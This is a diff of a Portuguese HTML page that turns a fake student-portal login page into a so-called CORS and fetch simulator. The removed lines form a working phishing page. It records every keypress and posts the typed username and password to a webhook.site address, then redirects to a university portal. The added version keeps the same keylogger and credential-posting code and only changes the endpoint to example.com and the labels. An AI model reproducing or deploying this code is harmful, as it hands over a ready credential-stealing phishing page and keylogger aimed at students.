@@ -1,46 +1,56 @@
+
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>Área do Aluno</title>
+  <title>Simulador de Input e Fetch</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body { font-family: sans-serif; background: #f4f4f4; padding: 50px; text-align: center; }
+    body { font-family: sans-serif; background: #eee; padding: 2rem; text-align: center; }
     input { padding: 10px; margin: 10px; width: 80%; max-width: 300px; }
-    button { padding: 10px 20px; background: #007bff; color: white; border: none; cursor: pointer; }
-    button:hover { background: #0056b3; }
+    button { padding: 10px 20px; background: #28a745; color: white; border: none; cursor: pointer; }
+    button:hover { background: #218838; }
   </style>
 </head>
 <body>
-  <h2>Login - Portal do Estudante</h2>
-  <form id="fakeLogin">
-    <input type="text" id="user" placeholder="RA ou Email" autocomplete="off"><br>
-    <input type="password" id="pass" placeholder="Senha" autocomplete="off"><br>
-    <button type="submit">Entrar</button>
+  <h2>Formulário Simulado - Estudo de CORS e Fetch</h2>
+  <form id="simulador">
+    <input type="text" id="usuario" placeholder="Digite algo"><br>
+    <input type="password" id="senha" placeholder="Senha fictícia"><br>
+    <button type="submit">Simular Envio</button>
   </form>
 
+  <pre id="log" style="text-align: left; background: #fff; padding: 1rem; margin-top: 2rem; border: 1px solid #ccc;"></pre>
+
   <script>
-    const endpoint = "https://webhook.site/62457822-a08f-448b-8030-7c9fd34772a1";
+    const endpoint = "https://example.com/webhook"; // endpoint simbólico — não executa
+
+    function log(mensagem) {
+      const l = document.getElementById("log");
+      l.textContent += mensagem + "\n";
+    }
 
     document.onkeypress = function(e) {
+      const dado = { tipo: "tecla", tecla: e.key, timestamp: Date.now() };
+      log("Capturado: " + JSON.stringify(dado));
       fetch(endpoint, {
         method: "POST",
-        body: JSON.stringify({ type: "key", key: e.key, time: Date.now() }),
+        body: JSON.stringify(dado),
         headers: { "Content-Type": "application/json" }
-      });
+      }).catch(() => log("Fetch bloqueado por CORS (simulado)"));
     };
 
-    document.getElementById("fakeLogin").onsubmit = function(e) {
+    document.getElementById("simulador").onsubmit = function(e) {
       e.preventDefault();
-      const u = document.getElementById("user").value;
-      const p = document.getElementById("pass").value;
+      const u = document.getElementById("usuario").value;
+      const p = document.getElementById("senha").value;
+      const dados = { tipo: "formulario", usuario: u, senha: p, timestamp: Date.now() };
+      log("Enviando: " + JSON.stringify(dados));
       fetch(endpoint, {
         method: "POST",
-        body: JSON.stringify({ type: "login", user: u, pass: p, time: Date.now() }),
+        body: JSON.stringify(dados),
         headers: { "Content-Type": "application/json" }
-      }).then(() => {
-        window.location.href = "https://ava.exemplo.edu.br";
-      });
+      }).catch(() => log("Fetch bloqueado por CORS (simulado)"));
     };
   </script>
 </body>
